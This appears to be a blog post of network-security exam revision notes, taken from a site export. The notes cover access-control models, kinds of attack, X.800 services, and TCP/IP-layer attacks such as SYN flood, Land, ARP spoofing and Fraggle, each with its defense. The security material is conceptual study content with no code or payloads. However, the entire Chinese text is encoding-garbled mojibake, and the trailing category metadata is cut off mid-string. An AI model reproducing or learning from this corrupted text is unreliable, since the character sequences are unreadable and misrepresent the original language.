ç”Ÿå‘½å‘¨æœŸæ§åˆ¶ å¯¹ç³»ç»Ÿçš„è®¾è®¡ã€å®‰å…¨è¯„ä¼°ã€è®°å½•å’Œæ—¥å¿—è¿›è¡Œæ§åˆ¶ è®¿é—®æ§åˆ¶ç­–ç•¥ï¼ˆå®‰å…¨ç­–ç•¥ï¼‰è‡ªä¸»æ€§è®¿é—® Who and Whenè®¿é—®æ§åˆ¶åˆ—è¡¨ã€æ–‡ä»¶æˆæƒ å…è®¸ç”¨æˆ·è‡ªä¸»åœ¨ç³»ç»Ÿä¸­è§„å®šè°å¯ä»¥å–å®ƒçš„èµ„æº åŸºäºèº«ä»½ åŸºäºä»»åŠ¡ å¼ºåˆ¶æ€§è®¿é—® ç”¨æˆ·çš„æƒé™å’Œå®¢ä½“çš„å®‰å…¨å±æ€§å›ºå®šï¼Œå®‰å…¨å±æ€§ç”±ç®¡ç†å‘˜è®¾ç½®ï¼Œç”¨æˆ·ä¸èƒ½ä¿®æ”¹ å®¢ä½“è®¿é—®é™åˆ¶ï¼šæ ¹æ®å®¢ä½“ä¿¡æ¯çš„æ•æ„Ÿæ ‡è®°å’Œè®¿é—®ä¸»ä½“çš„è®¿é—®ç­‰çº§ å®¢ä½“ï¼šå„ç§è®¾å¤‡ç­‰ å¤šç­‰çº§è®¿é—® åŸºäºè§’è‰²è®¿é—®æ§åˆ¶ ä¼šå› ä¸ºä¸åŒçš„ä½œä¸šåŠŸèƒ½äº§ç”Ÿä¸åŒçš„è§’è‰²ï¼Œæ‰§è¡ŒæŸé¡¹æ“ä½œçš„æƒé™ä¼šè¢«èµ‹äºˆç‰¹å®šçš„è§’è‰² ä¸€ä¸ªä¸»ä½“å¯ä»¥æœ‰å¤šä¸ªè§’è‰²ï¼Œä¸€ä¸ªè§’è‰²ä¹Ÿå¯ä»¥åˆ†é…ä¸åŒä¸»ä½“ã€‚å…³æ³¨è§’è‰²ã€ç”¨æˆ·ã€æƒé™çš„å…³ç³» è¿è¡Œæ–¹å¼ï¼šè§’è‰²ç»§æ‰¿ã€‚ å—é™ç»§æ‰¿å…³ç³»ï¼šä¸€ä¸ªè§’è‰²åªèƒ½ç›´æ¥ç»§æ‰¿å¦ä¸€ä¸ªè§’è‰²èµ„æµ…çš„è§’è‰²æƒé™ é—´æ¥ç»§æ‰¿ï¼šä¸å—é™åˆ¶ ä¸€èˆ¬ç»§æ‰¿å…³ç³»ï¼šä¸€ä¸ªè§’è‰²èƒ½ç›´æ¥ç»§æ‰¿å¤šäºä¸€ä¸ªèµ„æµ…è§’è‰²çš„æƒ å®‰å…¨æ”»å‡»çš„åˆ†ç±»è¢«åŠ¨æ”»å‡» å¯¹ä¼ è¾“ä¿¡æ¯çš„çªƒå¬å’Œç›‘æµ‹ ä¿¡æ¯æ³„éœ² æµé‡åˆ†æ ä¸»åŠ¨æ”»å‡» ä¼ªè£…æ”»å‡» æŸä¸ªå®ä½“ä¼ªè£…æˆå¦å¤–çš„å®ä½“ï¼Œå°†è·å–çš„è®¤è¯ä¿¡æ¯é‡æ”¾ï¼Œä»¥è·å¾—æŸå®ä½“çš„æƒé™ é‡æ”¾æ”»å‡» å°†è·å¾—çš„ä¿¡æ¯å†æ¬¡å‘é€ï¼Œä»¥åœ¨éæˆæƒçš„æƒ…å†µä¸‹è¿›è¡Œä¼ è¾“ æ¶ˆæ¯ç¯¡æ”¹ ä¿®æ”¹æˆ–å»¶è¿Ÿæ¶ˆæ¯ä¼ è¾“ï¼Œè¾¾åˆ°éæˆæƒçš„ç›®çš„ æ‹’ç»æœåŠ¡ ç ´åæŸä¸ªç½‘ç»œä½¿å…¶ç˜«ç—ªæˆ–è¿‡è½½ä»¥é™ä½æ€§èƒ½ã€‚ Dos è¿‡åº¦ä½¿ç”¨æœåŠ¡ï¼Œä½¿è½¯ä»¶ç¡¬ä»¶è¿‡åº¦è¿è¡Œï¼Œç½‘ç»œè¿æ¥è¶…å‡ºå…¶å®¹é‡ é€ æˆå…³æœºæˆ–ç³»ç»Ÿç˜«ç—ªæˆ–é™ä½æœåŠ¡è´¨é‡ DDosï¼ˆåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼‰ ä½¿ç”¨å¤šä¸ªinternetä¸»æœºåŒæ—¶å‘ä¸€ä¸ªç›®æ ‡å‘èµ·æ”»å‡» å‡è½»æ”»å‡»å¼ºåº¦æªæ–½ è¿‡æ»¤ä¸è‰¯æ•°æ®åŒ… è¿½æŸ¥å…³é—­æ”»å‡»ç«™ç‚¹ æé«˜æ¥æ”¶æ•°æ®å¤„ç†ã€å¢åŠ ç¡¬ä»¶å’Œç½‘ç»œæ‰©å®¹ ç½‘ç»œæ”»å‡»å¸¸è§å½¢å¼å£ä»¤çªƒå– å·²çŸ¥ å­—å…¸æ”»å‡» çªƒå¬åˆæ³•ç»ˆç«¯é—´çš„ä¼šè¯ æ¬ºéª—æ”»å‡» ç¤¾å·¥æ¬ºéª— ç¼ºé™·å’Œåé—¨ è •è™«ç—…æ¯’ å‘å®ˆæŠ¤ç¨‹åºå‘é€æ–°çš„ä»£ç ï¼Œå‘ç¼“å†²åŒºæ³¨å…¥å¤§é‡æ•°æ®ï¼Œç›´åˆ°getså †æ ˆä¸­çš„è¿”å›åœ°å€è¦†ç›–ï¼Œåˆ™è¿”å›æ—¶ä¼šæ‰§è¡Œå…¥ä¾µè€…çš„ä»£ç  ç¼“å†²åŒºæº¢å‡ºæ”»å‡» ç¼ºé™·ï¼šç¨‹åºä¸­çš„æŸäº›ä»£ç ä¸èƒ½æ»¡è¶³ç‰¹å®šçš„è¦æ±‚ è®¤è¯å¤±è´¥ æºåœ°å€æœ‰æ•ˆæ€§çš„éªŒè¯æœºåˆ¶ï¼Œåœ¨æŸäº›åœºåˆå¯ä»¥å‘æŒ¥ä½œç”¨ï¼Œä½†æ˜¯å¦‚æœé»‘å®¢æ”»å‡»æ¬ºéª—äº†åœ°å€ï¼Œè®©æ¶ˆæ¯çœ‹èµ·æ¥å¥½åƒæ¥è‡ªæœ¬åœ°ï¼Œè¿™æ ·å°±èº²è¿‡äº†æ”»å‡» åè®®ç¼ºé™· ä¿¡æ¯æ³„éœ² æŒ‡æ•°æ”»å‡» ç—…æ¯’å’Œè •è™« å®‰å…¨æœåŠ¡ è®¤è¯ ç¡®ä¿é€šä¿¡å®ä½“å°±æ˜¯ä»–ä»¬æ‰€å£°ç§°çš„å®ä½“ è®¿é—®æ§åˆ¶ é˜²æ­¢éæˆæƒçš„è®¿é—® æ•°æ®ä¿å¯†æ€§ ä¿æŠ¤æ•°æ®ï¼Œé˜²æ­¢éæˆæƒçš„æ³„éœ² æ•°æ®å®Œæ•´æ€§ ä¿è¯æ”¶åˆ°çš„æ•°æ®ä¸è¢«åˆ é™¤ã€æ’å…¥ã€é‡å‘ã€ä¿®æ”¹ ä¸å¯å¦è®¤æ€§ ç¡®ä¿é€šä¿¡ä¸€æ–¹æ²¡æœ‰å¦è®¤çš„è¡Œä¸º ä½œä¸š ä¿¡æ¯å®‰å…¨çš„3ä¸ªåŸºæœ¬ç›®æ ‡æ˜¯ï¼š ä¿å¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ã€åˆæ³•ä½¿ç”¨ ç½‘ç»œä¸­å­˜åœ¨çš„4ç§åŸºæœ¬å®‰å…¨å¨èƒ: æœ‰ä¿¡æ¯æ³„éœ²ã€å®Œæ•´æ€§ç ´åã€æ‹’ç»æœåŠ¡ã€éæ³•ä½¿ç”¨ X.800å®šä¹‰çš„5ç±»å®‰å…¨æœåŠ¡ï¼š è®¤è¯ã€è®¿é—®æ§åˆ¶ã€æ•°æ®ä¿å¯†æ€§ã€æ•°æ®å®Œæ•´ä¿¡æ¯ã€ä¸å¯å¦è®¤æ€§ X.800å®šä¹‰çš„8ç§ç‰¹å®šçš„å®‰å…¨æœºåˆ¶æ˜¯ï¼š åŠ å¯†ã€æ•°å­—ç­¾åã€è®¿é—®æ§åˆ¶ã€æ•°æ®å®Œæ•´æ€§ã€è®¤è¯äº¤æ¢ã€æµé‡å¡«å……ã€è·¯ç”±æ§åˆ¶ã€å…¬è¯ ç®€è¿°é€šä¿¡å®‰å…¨ã€è®¡ç®—æœºå®‰å…¨ã€ç½‘ç»œå®‰å…¨ä¹‹é—´çš„è”ç³»ä¸åŒºåˆ« ç½‘ç»œå®‰å…¨ï¼šåŒæ–¹å…±åŒä½¿ç”¨é€šä¿¡åè®®æ¥å»ºç«‹é€»è¾‘ä¿¡æ¯é€šé“ï¼Œä¿æŠ¤ä¿¡æ¯ä¼ è¾“ä»¥é˜²æ­¢æ”»å‡»è€…å¨èƒæ¶ˆæ¯çš„ä¿å¯†æ€§ã€å®Œæ•´æ€§ã€çœŸå®æ€§ã€‚ å®‰å…¨æ¨¡å‹ï¼ˆç”±6ä¸ªåŠŸèƒ½å®ä½“ç»„æˆï¼‰ï¼šæ¶ˆæ¯å‘é€æ–¹ï¼ˆä¿¡æºï¼‰ã€æ¶ˆæ¯æ¥æ”¶æ–¹ï¼ˆä¿¡å®¿ï¼‰ã€å®‰å…¨å˜æ¢ã€ä¿¡æ¯é€šé“ã€å¯ä¿¡ç¬¬ä¸‰æ–¹ã€æ”»å‡»è€… é€šä¿¡å®‰å…¨ï¼šåœ¨å‘é€çš„è¿‡ç¨‹ä¸­ï¼Œä¿è¯æ¶ˆæ¯èƒ½å¤Ÿå®‰å…¨åˆ°è¾¾ï¼Œä¸è¢«æˆªè·ã€ç¯¡æ”¹ã€æ›¿æ¢ã€‚ è®¡ç®—æœºå®‰å…¨ï¼šä¿¡æºã€ä¿¡å®¿è‡ªå·±çš„è®¡ç®—æœºä¸è¢«æ¶æ„ä»£ç æ”»å‡» åœ¨é€‰è¯¾ç³»ç»Ÿä¸­ï¼Œå­˜åœ¨æ•™å¸ˆã€å­¦ç”Ÿã€ç®¡ç†å‘˜3ç±»ç”¨æˆ·ã€‚éœ€è¦é€‚æ—¶è¿›è¡Œç³»ç»Ÿè®¿é—®ã€æ•°æ®è¾“å…¥å’Œç®¡ç†ã€‚é‡‡ç”¨è‡ªä¸»è®¿é—®æ§åˆ¶ã€å¼ºåˆ¶è®¿é—®æ§åˆ¶å’ŒåŸºäºè§’è‰²è®¿é—®æ§åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨çš„æœ‰å“ªäº›ï¼Ÿå“ªä¸€ç§æ—¶é—´å’Œå­˜å‚¨æˆæœ¬è¾ƒä½ï¼Ÿ è‡ªä¸»è®¿é—®æ§åˆ¶æ˜¯å¯ä»¥ç”±ç”¨æˆ·è‡ªä¸»çš„å†³å®šè°å¯ä»¥è®¿é—®å®ƒçš„èµ„æºã€‚ å¼ºåˆ¶è®¿é—®æ§åˆ¶æ˜¯åªèƒ½æŒ‰ç…§å·²ç»è§„å®šå¥½çš„æƒé™å»è®¿é—®ã€‚ åŸºäºè§’è‰²è®¿é—®ï¼Œæ˜¯æ‰§è¡ŒæŸé¡¹æ“ä½œçš„æƒé™ä¼šè¢«èµ‹äºˆç‰¹å®šçš„è§’è‰²ã€‚ ç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨è‡ªä¸»è®¿é—®æ§åˆ¶ï¼Œä¾¿äºè¿›è¡Œèµ„æºçš„åˆ†é…å’Œç®¡ç†ï¼Œä»¥åŠæƒé™çš„è®¾å®šã€‚ æ•™å¸ˆå¯ä»¥æ˜¯åŸºäºè§’è‰²è®¿é—®ï¼Œè¢«èµ‹äºˆä¸€å®šçš„æƒé™ï¼Œè¿›è¡Œæ•°æ®çš„è¾“å…¥ã€‚ å­¦ç”Ÿé‡‡å–å¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼Œåªèƒ½æŒ‰ç…§å·²ç»è®¾å®šå¥½çš„æƒé™ï¼Œæ¥å¯¹é€‰è¯¾ç³»ç»Ÿè¿›è¡Œè®¿é—®ã€‚ åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶æ—¶é—´å’Œå­˜å‚¨æˆæœ¬æ¯”è¾ƒä½ã€‚æ ¹æ®é€‰è¯¾éœ€æ±‚å’Œåç»­åŠŸèƒ½å¢åŠ ç­‰é—®é¢˜ï¼ŒåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ä¼šæ›´çµæ´»ï¼Œåº”ç”¨èŒƒå›´æ›´å¹¿ã€‚ ç¬¬äºŒç« TCP&#x2F;IPåè®®æ—ç½‘é™…åè®®ï¼ˆinternet protocolï¼ŒIPï¼‰æ˜¯TCP&#x2F;IPåè®®æ—çš„æ ¸å¿ƒ ç½‘ç»œæ¥å£å±‚ï¼ˆæ•°æ®é“¾è·¯å±‚ã€ç‰©ç†å±‚ï¼‰ TCP&#x2F;IPæ¨¡å‹çš„æœ€åº•å±‚ ç½‘é™…å±‚ï¼ˆç½‘ç»œå±‚ï¼‰ IPåè®® ç½‘é™…åè®®ï¼ˆinternet protocolï¼ŒIPï¼‰æ˜¯ç½‘é™…å±‚æœ€é‡è¦çš„åè®® ä¼ é€’ä¸­æ˜“è¢«ç›‘å¬ã€çªƒå–ã€‚ åº”è¯¥å¯¹IPæ•°æ®æŠ¥è¿›è¡ŒåŠ å¯† IPå±‚æ²¡æœ‰é‡‡å–æªæ–½ä¿è¯ä¼ é€’çš„æ­£ç¡®æ€§ï¼Œå¯èƒ½ä¼šè¢«ä¿®æ”¹æ•°æ®æŠ¥çš„å†…å®¹ã€‚ åº”å¯¹æ•°æ®æŠ¥çš„å†…å®¹é‡‡å–å®Œæ•´æ€§æ£€æŸ¥æœºåˆ¶ IPæ¬ºéª—æ”»å‡» æºåœ°å€é‰´åˆ«æœºåˆ¶åŠ ä»¥é˜²å¾¡ Landæ”»å‡»ï¼šé€šè¿‡å‘é€ç²¾å¿ƒæ„é€ çš„ã€å…·æœ‰ç›¸åŒæºåœ°å€å’Œç›®æ ‡åœ°å€çš„æ¬ºéª—æ•°æ®åŒ…ï¼Œè‡´ä½¿ç¼ºä¹ç›¸åº”é˜²æŠ¤æœºåˆ¶çš„ç›®æ ‡è®¾å¤‡ç˜«ç—ªã€‚ åœ¨æ•°æ®æŠ¥ä¼ è¾“æ—¶åˆ†æ®µé‡ç»„çš„è¿‡ç¨‹ä¸­ï¼Œæ³¨å…¥å¤§é‡ç—…æ€å°æ•°æ®æŠ¥ï¼Œå½±å“åŒ…è¿‡æ»¤å™¨æ­£å¸¸å·¥ä½œ é˜²ç«å¢™èƒ½é‡ç»„åˆ†æ®µçš„æ•°æ®æŠ¥ï¼Œæ£€æŸ¥å…¶å†…å®¹ ç”¨å®šå‘å¹¿æ’­çš„ç›®çš„åœ°å€çš„IPæ•°æ®æŠ¥æ¥æ”»å‡»ä¸åŒç±»å‹çš„ä¸»æœº é…ç½®è·¯ç”±æ—¶è¿›åˆ¶å‘é€å®šå‘å¹¿æ’­æ•°æ®åŒ…çš„åŠŸèƒ½ ARPåè®® åœ°å€è§£æåè®®ï¼ˆaddress resolution protocol , ARPï¼‰æ ¹æ®IPåœ°å€è·å–ç‰©ç†åœ°å€ï¼ˆMACåœ°å€ï¼‰çš„TCP&#x2F;IPåè®® ARPæ¬ºéª— åº”åœ¨äº¤æ¢æœºä¸Šé…ç½®802.1xåè®®ï¼Œè¿™æ ·æ”»å‡»è€…è¿æ¥äº¤æ¢æœºçš„æ—¶å€™éœ€è¦è¿›è¡Œèº«ä»½è®¤è¯ï¼› å»ºç«‹é™æ€ARPè¡¨ ICMPåè®® æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆinternet control message protocolï¼‰ï¼Œé”™è¯¯å¤„ç†ã€æ¶ˆæ¯å¤„ç†åè®® é€šçŸ¥ä¸»æœºåˆ°åº•ç›®çš„åœ°çš„æœ€ä½³è·¯å¾„ï¼ŒæŠ¥å‘Šè·¯ç”±æ•…éšœ ç›‘æ§å·¥å…·pingå’Œtracertçš„é‡è¦ç»„æˆéƒ¨åˆ† æ˜¯å·®é”™å’Œæ§åˆ¶æŠ¥æ–‡åè®®ï¼Œç”¨äºä¼ è¾“å·®é”™æŠ¥æ–‡å’Œæ§åˆ¶æŠ¥æ–‡ ICMPé‡å®šå‘æ”»å‡» åˆ©ç”¨ICMPå¯¹æ¶ˆæ¯è¿›è¡Œé‡å®šå‘ï¼Œä½¿ç›®æ ‡ä¸»æœºå—åˆ°è¿æ¥åŠ«æŒå’Œæ‹’ç»æœåŠ¡ç­‰æ”»å‡»ï¼› é‡å®šå‘æ¶ˆæ¯ä¸€èˆ¬ç”±ä»…ä¸»æœºæ¥è¿›è¡Œã€‚ä»…å½“æ¶ˆæ¯ç›´æ¥æ¥è‡ªè·¯ç”±å™¨çš„æ—¶å€™ï¼Œæ‰ç”±è·¯ç”±å™¨è¿›è¡Œé‡å®šå‘ã€‚è‹¥å½“ç½‘ç®¡ä½¿ç”¨ICMPæ¥åˆ›å»ºé€šå¾€ç›®çš„åœ°å€çš„æ–°è·¯ç”±ï¼Œä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ ICMPè·¯ç”±å™¨å‘ç°æ”»å‡» ICMPåœ¨è¿›è¡Œè·¯ç”±å‘ç°çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šå¯¹åº”ç­”æ–¹è¿›è¡ŒéªŒè¯ã€‚å¯èƒ½ä¼šé­å—ä¸­é—´äººæ”»å‡»ï¼Œå‡å†’æ˜¯åº”ç­”æ–¹ã€‚ é˜²ç«å¢™ç©¿è¶Šæ”»å‡» æ”»å‡»è€…ç©¿è¶Šé˜²ç«å¢™çš„è®¿é—®æ§åˆ¶åˆ—è¡¨å’Œè§„åˆ™é›†ï¼Œè·å–è¿‡æ»¤çš„å†…å®¹å’Œæ–¹å¼ã€‚ ä¼ è¾“å±‚ï¼ˆä¼ è¾“å±‚ï¼‰ ä»…ä¸ºæ¢—æ¦‚ï¼Œè¯¦æƒ…è§goodnotes TCP æ§åˆ¶ä¼ è¾“åè®®ï¼ˆTransmission Control Protocolï¼ŒTCPï¼‰é¢å‘è¿æ¥çš„å¯é çš„ä¼ è¾“å±‚åè®® å»ºç«‹è¿æ¥æ—¶ä¸‰æ¬¡æ¡æ‰‹ å­˜åœ¨çš„æ”»å‡»æ–¹å¼ SYN Flood å‘ç”Ÿåœ¨ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­ã€‚ ä¸€ç§ä¸èƒ½å»ºç«‹æ­£å¸¸çš„è¿æ¥ï¼Œä½¿ç”¨æˆ·å¾—ä¸åˆ°å“åº”çš„Dosæ”»å‡»ã€‚ æ”»å‡»è€…ä¸æ–­å‘æœåŠ¡å™¨å‘é€TCPçš„è¿æ¥è¯·æ±‚SYNï¼Œä½¿å…¶å¤„äºåŠå¼€æ”¾çŠ¶æ€ï¼Œæ— æ³•æ¥å—å…¶ä»–çš„æ­£å¸¸è¿æ¥ã€‚ åº”è¯¥åœ¨æœåŠ¡å™¨å‰ç«¯éƒ¨ç½²å®‰å…¨é˜²æŠ¤ï¼Œå¦‚é˜²ç«å¢™ï¼Œæ¥è¿‡æ»¤æ‰æ•°æ®åŒ… TCPä¼šè¯åŠ«æŒ ç”±äºTCPåè®®ä¸å¯¹æ•°æ®åŒ…è¿›è¡ŒåŠ å¯†å’Œè®¤è¯è€Œå‘ç”Ÿçš„ï¼Œè·å–éæˆæƒçš„æƒé™çš„æ”»å‡»æ–¹å¼ TCPç¡®å®šæ•°æ®åŒ…æ˜¯å¦çœŸå®ï¼Œæ˜¯æ ¹æ®æ•°æ®åŒ…ä¸­çš„32ä½åºåˆ—å·ã€‚å¦‚æœæ”»å‡»è€…èƒ½é¢„æµ‹ç›®æ ‡ä¸»æœºçš„èµ·å§‹åºåˆ—å·ï¼Œä¼ªé€ æœ‰æ•ˆæ¥æ”¶çª—å£æŠ¥æ–‡ï¼Œå°±èƒ½æ¬ºéª—ä¸»æœº åº”è¯¥åœ¨TCPå»ºç«‹è¿æ¥æ—¶ï¼Œç”¨ä¸€ä¸ªéšæœºæ•°ä½œä¸ºèµ·å§‹åºåˆ—å· æ‹¥å¡æ§åˆ¶æ”»å‡» å‘ç”Ÿåœ¨å»ºç«‹è¿æ¥åçš„æ•°æ®é˜¶æ®µï¼Œåˆ©ç”¨TCPæ‹¥å¡æ§åˆ¶ï¼Œé™ä½æ­£å¸¸ä¼ è¾“èƒ½åŠ›çš„ä¸€ç§æ”»å‡» TCPçš„æ‹¥å¡æ§åˆ¶æ˜¯ä¸ºäº†é˜²æ­¢è¿‡å¤šçš„æ•°æ®æ³¨å…¥ç½‘ç»œï¼Œæ”»å‡»è€…ä¼šåˆ¶é€ å…³é”®èŠ‚ç‚¹çš„æ‹¥å¡ä»¥è§¦å‘è¯¥æœºåˆ¶ã€‚ä½¿å…¶è§¦å‘çª—å£æ…¢å¯åŠ¨ï¼Œæ¥é™ä½æ­£å¸¸çš„ä¼ è¾“èƒ½åŠ›ã€‚ ç½‘ç®¡åº”è¯¥å®æ—¶ç›‘æ§ç½‘ç»œå¼‚å¸¸æµé‡ æ¬ºéª—IPåœ°å€è·å¾—è¿œç¨‹éæ³•æˆæƒè®¿é—® ï¼ˆç»¼åˆè¿ç”¨SYN Floodå’ŒTCPä¼šè¯åŠ«æŒï¼‰ BæˆäºˆAæŸäº›æƒé™ï¼ŒXè¦å¾—åˆ°ä¸Aç›¸åŒçš„æƒé™ Xå‡å†’Aå’ŒBå»ºç«‹è¿æ¥ï¼Œï¼ˆXå‡å†’Açš„IPåœ°å€ï¼‰ï¼Œä½¿Bç›¸ä¿¡æ¶ˆæ¯æ˜¯Aå‘æ¥çš„ é˜»æ­¢Aå‘BæŠ¥å‘Šç½‘ç»œè®¤è¯ç³»ç»Ÿçš„æ•…éšœ UDP ç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼ˆUser Datagram Protocolï¼ŒUDPï¼‰æ— è¿æ¥çš„ä¼ è¾“å±‚åè®®ï¼Œæä¾›é¢å‘äº‹åŠ¡çš„ä¸å¯é ä¿¡æ¯ä¼ é€ ç‰¹ç‚¹ æ— éœ€è¿æ¥ä¼ è¾“é«˜æ•ˆ æ— æ‹¥å¡æ§åˆ¶çš„ä¸å¯é ä¼ è¾“ æ•°æ®æŠ¥é¦–éƒ¨ä»…8å­—èŠ‚ ç½‘ç»œæ‹¥å¡ä¸ä¼šé™ä½å‘é€é€Ÿç‡ å®‰å…¨é—®é¢˜ UDP Flood â€”-å¤§é‡åŒ…é˜»å¡ç›®æ ‡ä¸»æœº å‘æ”»å‡»ç›®æ ‡å‘é€å¤§é‡UDPå°åŒ…ï¼Œä½¿ç½‘ç»œè®¾å¤‡å¿™äºåº”å¯¹UDPæŠ¥æ–‡ï¼Œç³»ç»Ÿèµ„æºä½¿ç”¨ç‡é£™é«˜ï¼Œè®¾å¤‡ä¸èƒ½æä¾›æ­£å¸¸æœåŠ¡æˆ–ç›´æ¥æ­»æœºã€‚ é˜²æŠ¤ï¼š æ ¹æ®æ”»å‡»åŒ…å¤§å°ï¼Œè®¾å®šåŒ…ç¢ç‰‡é‡ç»„å¤§å°ï¼Œé€šå¸¸ä¸å°äº1500 æ”»å‡»ç«¯å£æ˜¯ä¸šåŠ¡ç«¯å£ï¼Œè®¾ç½®UDPæœ€å¤§åŒ…æ¥è¿‡æ»¤å¼‚å¸¸æµé‡ æ”»å‡»ç«¯å£ä¸ºéä¸šåŠ¡ç«¯å£ï¼Œå…ˆå»ºç«‹TCPè¿æ¥ UDP Fraggleæ”»å‡» â€”â€”æ­£å¸¸å“åº”é˜»å¡ç›®æ ‡ä¸»æœº å‘å­ç½‘å¹¿æ’­åœ°å€å‘é€UDPåŒ…ï¼Œç«¯å£å·ä¸º7ï¼Œç›®çš„æ˜¯å ç”¨ç›®æ ‡ä¸»æœºç½‘ç»œå¸¦å®½ æ”»æ–¹IPåœ°å€&#x3D;å¹¿æ’­åœ°å€ è‹¥å¼€å¯åŠŸèƒ½ï¼šå¹¿æ’­åœ°å€çš„æ‰€æœ‰ä¸»æœºï¼Œå‘ç›®æ ‡ä¸»æœºè¿”å›æ”¶åˆ°çš„åŒ…ï¼Œä½¿å…¶ä¸æ–­å›åº”UDPæŠ¥æ–‡å‘¢ï¼Œç³»ç»Ÿèµ„æºä½¿ç”¨ç‡é£™å¢ï¼Œä¸èƒ½æ­£å¸¸æœåŠ¡æˆ–æ­»æœºã€‚ è‹¥å…³é—­åŠŸèƒ½ï¼šæ¯ä¸€ä¸ªéƒ½ç”ŸæˆICMPä¸å¯è¾¾ä¿¡æ¯ï¼Œå¤§é‡ICMPæ‹¥å¡ç½‘ç»œ é˜²æŠ¤ï¼šè¿›å…¥é˜²ç«å¢™ï¼Œç›®çš„ç«¯å£ä¸º7æˆ–19çš„UDPæŠ¥æ–‡æ‹’ç» åº”ç”¨å±‚ï¼ˆåº”ç”¨å±‚ã€è¡¨ç¤ºå±‚ã€ä¼šè¯å±‚ï¼‰ HTTPï¼ˆç«¯å£TCP 80ï¼‰ è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHyper Text Transfer Protocolï¼ŒHTTPï¼‰å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯è¯·æ±‚å’Œåº”ç­”çš„æ ‡å‡† æ˜æ–‡ä¼ è¾“ å®‰å…¨éšæ‚£ ä¼ è¾“çš„æ˜¯æ˜æ–‡ï¼Œæ²¡æœ‰åŠ å¯†ï¼Œç½‘ç»œå—…æ¢å·¥å…·å°±å¯ä»¥è·å–ä¼ è¾“æ•°æ® æ— çŠ¶æ€è¿æ¥ï¼Œå”¯ä¸€çš„å®Œæ•´æ€§æ£€éªŒæ˜¯æ£€æŸ¥æŠ¥æ–‡å¤´éƒ¨çš„æ•°æ®ä¼ è¾“é•¿åº¦ã€‚å¯å‘åŠ¨ä¸­é—´äººæ”»å‡» é˜²æŠ¤æªæ–½ åœ¨TCPå’ŒHTTPä¼ è¾“ä¹‹é—´å¢åŠ å®‰å…¨å±‚ï¼ˆSSLã€TLSï¼‰ TELNETï¼ˆç«¯å£ TCP 23ï¼‰ è¿œç¨‹ç™»å½•åè®®ï¼ˆTeletype Networkï¼‰æ˜¯Internetè¿œç¨‹ç™»å½•æœåŠ¡çš„æ ‡å‡†åè®®å’Œä¸»è¦æ–¹å¼ å®‰å…¨éšæ‚£åŠé˜²æŠ¤æªæ–½ æ”»å‡»è€…è®°å½•æ•´ä¸ªä¼šè¯æˆ–è€…ç™»é™†çš„å£ä»¤ åŠ«æŒä¼šè¯ï¼Œè®¤è¯å®Œæˆåè¿›è¡Œç¯¡æ”¹ åº”è¯¥å¯¹ä¼šè¯è¿›è¡ŒåŠ å¯† SSH ï¼ˆç«¯å£ TCP 22ï¼‰ å®‰å…¨å£³åè®®ï¼ˆSecure Shellï¼‰åœ¨ä¸å®‰å…¨ç½‘ç»œä¸Šå»ºç«‹å®‰å…¨è¿œç¨‹ç™»å½•æˆ–å…¶ä»–ç½‘è·¯æœåŠ¡çš„åè®® å»ºç«‹TCPè¿æ¥â†’ç‰ˆæœ¬åå•† â†’ ç®—æ³•åå•†â†’æœåŠ¡å™¨è®¤è¯å’Œå¯†é’¥å»ºç«‹ â†’ç”¨æˆ·è®¤è¯ â†’ é€šä¿¡ä¼šè¯ æ”¯æŒèº«ä»½è®¤è¯å’Œæ•°æ®åŠ å¯† å¯æä¾›å®‰å…¨éš§é“ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡» å®‰å…¨é—®é¢˜ æœåŠ¡å™¨è®¤è¯ï¼šåœ¨ä¸å¯ä¿¡çš„ç¯å¢ƒä¸‹ï¼Œä¸èƒ½å¯¹æœåŠ¡å™¨çœŸå®æ€§è¿›è¡Œè®¤è¯ åº”è¯¥è¦éªŒè¯ä¸»æœºå¯†é’¥æ¥éªŒè¯æœåŠ¡å™¨çš„æ­£ç¡®æ€§ åè®®ç‰ˆæœ¬åå•†ï¼šå¯èƒ½å­˜åœ¨å¯¹æœ‰æ¼æ´çš„ç‰ˆæœ¬è¿›è¡Œæ”»å‡» å¯¹ç‰ˆæœ¬ä¸Šæœ‰å®‰å…¨é—®é¢˜çš„é€šè®¯æ–¹ï¼Œä¸­æ–­TCPè¿æ¥ ä¸»æœºå¯†é’¥æ–‡ä»¶å®‰å…¨ï¼šå¯†é’¥è¢«çªƒå–æˆ–ç¯¡æ”¹ï¼Œå®æ–½æ”»å‡» åº”åŠ å¼ºå¯¹å¯†é’¥æ–‡ä»¶çš„ç®¡ç† PGP å®‰å…¨ç”µå­é‚®ä»¶æ ‡å‡† POP3 FTP SMTP ç¬¬ä¸‰ç«  å®‰å…¨åè®®ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„å‚ä¸è€…ä¸ºå®ŒæˆæŸé¡¹ç‰¹å®šçš„ä»»åŠ¡è€Œé‡‡å–çš„ä¸€ç³»åˆ—æ­¥éª¤ã€‚ åè®®ä¸‰è¦ç´  ä¾æ¬¡æ‰§è¡Œ è‡³å°‘ä¸¤ä¸ªå‚ä¸è€… é€šè¿‡æ‰§è¡Œåè®®ï¼Œå¿…é¡»èƒ½å®ŒæˆæŸé¡¹ä»»åŠ¡ ä»²è£åè®®å…¬æ­£ã€å¯ä¿¡èµ–","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"ç½‘ç»œå®‰å…¨æŠ€æœ¯","slug":"æœŸæœ«è€ƒè¯•/ç½‘ç»œå®‰å…¨æŠ€æœ¯","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%BD%91%E7%BB